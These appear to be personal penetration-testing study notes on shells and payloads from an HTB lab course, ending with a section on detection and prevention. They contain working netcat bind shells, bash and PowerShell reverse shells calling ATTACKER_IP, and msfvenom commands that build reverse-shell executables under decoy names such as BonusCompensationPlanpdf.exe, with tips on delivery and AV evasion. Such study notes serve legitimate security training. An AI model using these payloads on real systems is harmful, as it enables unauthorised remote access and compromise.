High-Level Goals:

2 / 17 – Shells vs Payloads

2.1 – What is a Shell?

  • Interface that lets me run OS commands and see output.
  • Examples:
    • Linux: bash, sh, zsh.
    • Windows: cmd.exe, powershell.exe, pwsh.
  • Normally used after some kind of access (RCE, file upload, exploit, etc.).

2.2 – What is a Payload?

  • Code I deliver to the target to give me control (reverse shell, Meterpreter, etc.).
  • Common sources:
    • Metasploit built-ins like windows/meterpreter/reverse_tcp.
    • msfvenom for standalone binaries/scripts.
    • Exploit-DB / GitHub PoCs carrying shellcode or shell commands.
  • Job: create a comms channel (bind shell, reverse shell, staged Meterpreter, …).

3 / 17 – Anatomy of a Shell

3.1 – Local Shells in Pwnbox

  • Bash – default Linux shell, text-based, good for scripting ($ / user@host:~$ prompt).
  • PowerShell Core (pwsh) – cross-platform PowerShell on Linux/Windows/macOS.

Checking PowerShell Edition:

$PSVersionTable
  • Key fields: PSVersion (version) and PSEdition (Core vs Desktop).
  • Edition matters when choosing payloads / scripts that rely on specific PS features.

3.2 – Interactive vs Non-Interactive Shells

  • Interactive shell: supports Ctrl+C, arrows, tab, password prompts, sudo, editors, etc.
  • Primitive/non-interactive shell: often what you get from raw nc reverse shells.
  • Typical issues: no prompt, broken arrows/tab, sudo/ssh/editors unreliable.
  • Plan: use these shells to get in, then upgrade to a proper TTY later.

4 / 17 – Bind Shells

4.1 – Concept

  • Victim opens a TCP port and binds a shell to it.
  • Attacker connects in to control that shell.
  • Requires inbound connectivity to the victim (often blocked in real networks).

4.2 – Generic Linux Bind Shell (nc -e)

# On victim: bind a bash shell to TCP port 4444 nc -lvnp 4444 -e /bin/bash # On attacker: connect to the victim's bind shell nc <victim-ip> 4444

4.3 – Linux Bind Shell Without -e (mkfifo Trick)

# On victim mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f # On attacker nc <victim-ip> 4444

4.4 – mkfifo Bind Shell with Cleanup

# On victim mkfifo /tmp/f; nc -lvnp 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f # On attacker nc <victim-ip> 4444
Personal Note: In real assessments I usually prefer reverse shells – getting outbound traffic from a victim is much easier than opening inbound ports through firewalls/NAT. Bind shells are great for labs and understanding the concept.

5 / 17 – Reverse Shells (Windows Lab)

5.1 – Concept

  • Victim = client (dials out), attacker = listener.
  • Reverse shells are more realistic because egress is usually less restricted.

5.2 – Generic Linux Reverse Shell

# On attacker nc -lvnp 4444 # On victim bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

5.3 – HTB Lab: ACADEMY-SHELLS-WIN10

  • Target: 10.129.11.9 – ACADEMY-SHELLS-WIN10.
  • Access: RDP as htb-student / [REDACTED].
  • Task: establish a reverse shell back to my box and identify hostname.

Listener:

# 1) Find my VPN IP ip a | grep tun0 # 2) Start listener nc -lvnp 4444

PowerShell Reverse Shell (on target):

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

6 / 17 – Introduction to Payloads

6.1 – What a Payload Actually Does

  • Runs on the target after RCE/upload/exploit triggers.
  • Main jobs:
    • Give me a shell (bind or reverse).
    • Give me an agent (e.g. Meterpreter).
    • Run a single command (download + execute another stage).
  • Mental model: exploit opens the door, payload walks through.

6.2 – Where My Payloads Come From

  • Metasploit modules: choose PAYLOAD inside msfconsole.
  • MSFvenom: standalone files: .exe, .elf, .aspx, .php, …
  • Manual one-liners: Bash /dev/tcp, PowerShell reverse shells.
  • Exploit PoCs: swap their payload section for my own shellcode/command.

6.3 – Metasploit Payload Flow

msfconsole use <exploit/module> set RHOSTS <target-ip> set RPORT <port> # choose payload set PAYLOAD <payload/name> # reverse shells: listener settings set LHOST <my-vpn-ip (tun0)> set LPORT <my-port> run
Bind vs Reverse in Metasploit:
- .../reverse_tcp → target connects back to me.
- .../bind_tcp → target listens, I connect in.

6.4 – MSFvenom Cheat Slot

# Generic msfvenom -p <payload> LHOST=<my-vpn-ip> LPORT=<my-port> -f <format> -o shell.<ext> # Windows x64 Meterpreter reverse shell msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe # Linux x64 reverse shell ELF msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
  • -p – payload name (OS + type + transport).
  • -f – output format (exe, elf, aspx, php, raw, …).
  • -o – output file.

6.5 – Manual “Custom” Payloads

Linux bash reverse shell:

# On attacker nc -lvnp 4444 # On victim bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Windows PowerShell reverse shell:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

6.6 – Staged vs Stageless

  • Staged: small stager + extra network round trips; good when space is tight.
  • Stageless: full payload in one go; simpler and more robust on flaky networks.
  • For OSCP-style labs I default to stageless unless I’m size-constrained.

8 / 17 – Crafting Payloads with MSFvenom

8.1 – Why MSFvenom?

  • When Metasploit can’t reach a target directly (no route, external-only, etc.).
  • Generate a payload file, deliver it (email/USB/link), wait for execution.
  • Can also encode/encrypt payloads to dodge simple AV signatures.

8.2 – Listing Payloads

msfvenom -l payloads

Output shows OS, staged vs stageless, and description for each payload.

8.3 – Staged vs Stageless in Names

  • Staged: linux/x86/shell/reverse_tcp (separate shell + network stages).
  • Stageless: linux/zarch/meterpreter_reverse_tcp (single combined blob).
  • Windows pair: windows/meterpreter/reverse_tcp (staged) vs windows/meterpreter_reverse_tcp (stageless).

8.4 – General MSFvenom Pattern

msfvenom -p <payload> LHOST=<my-ip> LPORT=<my-port> -f <format> > output_file
  • -p select payload, LHOST/LPORT for reverse callback, -f format, then redirect to file.

8.5 – Stageless Linux Reverse Shell

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

Delivered to a Linux admin box; once executed, netcat listener caught a shell on port 443.

8.6 – Stageless Windows Reverse Shell

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

Executed on a Windows 10 host; listener received a basic cmd shell.

Real world note: raw msfvenom .exes are usually eaten by Defender. In a real engagement I’d push raw shellcode (-f raw/-f csharp) and use a custom loader.

8.7 – MSFvenom Checklist

  • Pick correct OS/arch (linux/x64, windows/x86, …).
  • Choose staged vs stageless based on size/network conditions.
  • Set reachable LHOST/LPORT and believable filename.
  • Plan delivery + start listener before the target executes.

11 / 17 – Spawning Interactive Shells

Focus here: turn ugly non-TTY shells into proper interactive shells.

11.1 – Why It Matters

  • Non-TTY shells break su/sudo, editors, prompts, and job control.
  • TTY shells behave like a normal terminal, which is essential for privesc and pivoting.

11.2 – Python PTY Upgrade

python -c 'import pty; pty.spawn("/bin/sh")' # or python3 -c 'import pty; pty.spawn("/bin/bash")'

After running this I get a better prompt and working line editing:

sh-4.2$ whoami apache

11.3 – Other Techniques (Quick Ref)

  • script /dev/null -c bash if script exists.
  • Terminal-side fixes: Ctrl+Z → stty raw -echo → fg → reset.
  • As a last resort, upload a static socat and re-connect with a fully interactive listener.
Habit: upgrading the shell is one of my first steps after initial code execution.

12 / 17 – Introduction to Web Shells

12.1 – What is a Web Shell?

  • Server-side script (php, aspx, jsp) that executes OS commands and returns output over HTTP.
  • Controlled via browser or tools like curl/wget.
  • Bridges web exploitation and OS-level access.

12.2 – Typical Workflow

  • Exploit upload/RCE/LFI in the web app.
  • Drop a shell file into a web-accessible directory.
  • Hit it via URL, pass commands as parameters.
  • Use it to enumerate, then ideally drop a more stable reverse shell.

12.3 – Pros & Cons

  • Pros: rides HTTP/S (often allowed), tiny scripts, can be disguised as images.
  • Cons: clunky / non-interactive, noisy in logs, can be easily removed once found.
Goal: use web shells as a bridge, not a permanent home – pivot to a proper reverse/TTY shell ASAP.

17 / 17 – Detection & Prevention (Blue-Team Lens)

17.1 – Core Detection Pillars

  • Initial Access: anomalous auth/exploit attempts on web, RDP, SMB, VPN.
  • Execution: suspicious PowerShell/bash activity, strange binaries in temp.
  • C2: odd outbound HTTP/S, DNS, or high ports like 4444.

17.2 – High-Yield Blue-Team Wins

  • Alert when .php/.aspx land in web-facing image/uploads dirs.
  • Monitor service accounts (www-data, IIS apppools) spawning shells.
  • Baseline NetFlow and flag new external destinations or spiky POSTs from servers.

17.3 – Network Visibility

  • Accurate asset inventory + network map.
  • DPI / IDS/IPS at chokepoints.
  • Centralised logs (proxy, firewall, VPN gateways, NetFlow).

17.4 – Endpoint Hardening

  • AV/EDR everywhere, including web servers.
  • PowerShell script block logging + Sysmon (Event ID 1 for process creation).
  • Aggressive patching to kill “evergreen” exploits like MS17-010.

17.5 – Architectural Mitigations

  • Least privilege: no local admin by default, tight sudo rules.
  • Segmentation: DMZ isolated, SMB/RDP blocked where not required.
  • Egress filtering: deny-by-default outbound from servers; allowlist only what’s needed.

17.6 – Attacker Mental Model

  • Every shell leaves network + endpoint artifacts.
  • Assume uploads and interactive commands are monitored.
  • Real stealth means living off the land and blending with normal admin behaviour.
